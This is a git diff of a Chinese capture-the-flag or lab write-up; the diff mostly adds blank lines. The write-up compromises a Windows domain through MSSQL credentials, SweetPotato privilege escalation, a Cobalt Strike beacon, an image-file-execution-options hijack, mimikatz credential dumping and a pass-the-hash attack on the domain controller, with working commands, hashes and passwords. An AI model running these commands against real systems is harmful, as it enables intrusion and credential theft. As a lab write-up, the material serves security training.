@@ -45,16 +45,23 @@ repost:
 <!-- Place resource files in the current article directory and reference them using relative paths, like this: `![alt](images/screenshot.jpg)`. -->
 
 访问发现是Windows主机，但并没有什么有用的信息
+
 ![](images/9226450074ff5fe86d440023bee438c2.png)
+
+
 
 ![](images/9a5a5f3b505e880a061b8beb9cb67e6e.png)
 fscan开扫，发现m ssql数据库用户名和密码，MDUT拿到Shell。
+
 ![](images/70bafd8876ceab5b38ce3b73f4fd15d1.png)
 执行whoami查看用户，发现是sqlserver，权限较低。
+
 ![](images/41c5e43947475ec601b8f47f3087e1f4.png)
 尝试利用Sweetpotato进行提权。
+
 ![](images/9e92ad40940c2791d0decca455d50e5a.png)
 命令执行 C:/Users/Public/SweetPotato.exe -a "whoami"
+
 ![](images/19793dc78c31307c764a69dba50ba21c.png)
 发现可以正常执行，上传cs马，执行cs马
 
@@ -62,13 +69,18 @@ fscan开扫，发现m ssql数据库用户名和密码，MDUT拿到Shell。
 C:/Users/Public/SweetPotato.exe -a "C:/Users/Public/beacon_x64.exe"
 ```
 
+
+
 ![](images/be593718352129c88d17556a2935f4da.png)cs成功上线
+
 ![](images/f23ce3745e2757e875150fbc6c667ebb.png)
 执行命令，得到flag1
 
 ```
 shell type C:\Users\Administrator\flag\flag01.txt
 ```
+
+
 
 ![](images/448b26a2fc9c76077e5c18a77792db2e.png)
 
@@ -94,6 +106,8 @@ John:1008:aad3b435b51404eeaad3b435b51404ee:eec9381b043f098b011be51622282027:::
 shell netstat -ano
 ```
 
+
+
 ![](images/79888364eb73aae0090bc62bc7a4f4e1.png)
 看到3389端口指向`172.22.8.31`另一个主机
 查看在线用户
@@ -102,10 +116,14 @@ shell netstat -ano
 shell quser || qwinst
 ```
 
+
+
 ![](images/7b03f99152439c5df719fd52401c4b6b.png)
 发现john用户，可以cs注入进程进行上线。
+
 ![](images/d88bcd0245f711a689e037faad597c33.png)
 成功上线John
+
 ![](images/6bb36f84fc16aba7f4b50344a16b494a.png)
 查看共享资源，列出目录文件
 
@@ -113,6 +131,8 @@ shell quser || qwinst
 shell net use
 shell dir \\tsclient\c
 ```
+
+
 
 ![](images/3bdd3725a5d57a1b4e3d188453adf099.png)
 读取文件，拿到账号密码，并提醒映像劫持
@@ -215,6 +235,8 @@ vps
 proxychains4 -q crackmapexec smb 172.22.8.0/24 -u 'Aldrich' -p 'Ald@rLMWuy7Z!#'
 ```
 
+
+
 ![](images/02e6886ee760160c87849c925d3218c8.png)
 发现可以登录`172.22.8.46`主机，但是会显示密码过期，使用`smbpasswd`修改密码
 [Lex-Case/Impacket: Impacket is a collection of Python classes for working with network protocols.](https://github.com/Lex-Case/Impacket/tree/master)
@@ -223,12 +245,16 @@ proxychains4 -q crackmapexec smb 172.22.8.0/24 -u 'Aldrich' -p 'Ald@rLMWuy7Z!#'
 proxychains4 -q python3 smbpasswd.py xiaorang.lab/Aldrich:'Ald@rLMWuy7Z!#'@172.22.8.46 -newpass 'QWERqwer1234'
 ```
 
+
+
 ![](images/83f17f9a75e9b9728c53d436197877f0.png)
 RDP远程桌面连接
 
 ```
 proxychains4 rdesktop 172.22.8.46 -u Aldrich -d xiaorang.lab -p 'QWERqwer1234' -r disk:share=/home/kali/Desktop/tmp
 ```
+
+
 
 ![](images/62d5e47ec79406a42c2e6e29100a880a.png)
 
@@ -239,11 +265,16 @@ proxychains4 rdesktop 172.22.8.46 -u Aldrich -d xiaorang.lab -p 'QWERqwer1234' -
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
 ```
 
+
+
 ![](images/5aa6c8fcc38be58e66ac5f472bdacdb4.png)
 开始，锁定
+
 ![](images/8dcfc0a28c64e2fda7f6a5a8297f82f9.png)
 点击放大镜
+
 ![](images/c1c5d44ede8c677c4010c68f4971f4a2.png)
+
 ![](images/43ae04d7128b1df7c451a202277ff99e.png)
 成功提权，读flag02
 
@@ -251,8 +282,11 @@ REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 type C:\User\Administrator\flag\flag02.txt
 ```
 
+
+
 ![](images/feff7846d15fa619bb16a8660b525cb5.png)
 尝试查看主机是否出网，
+
 ![](images/6be329c8f1ddbc9687e9c609491a6486.png)
  上传`mimikatz`，同样位置执行
 
@@ -261,11 +295,14 @@ mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit
  ```
 
 拿到用户名和NTML哈希，哈希传递
+
 ![](images/366b773d340839607a2191e9bc01347f.png)
 拿PTH打DC
 
 ```
 proxychains4 crackmapexec smb 172.22.8.15 -u WIN2016$ -H b5a0472a0c4933f0d50b7c499d267e0f -d xiaorang -x "type C:\Users\Administrator\flag\flag03.txt"
 ```
+
+
 
 ![](images/784de068039ffc9e1edaeaa809d34014.png)
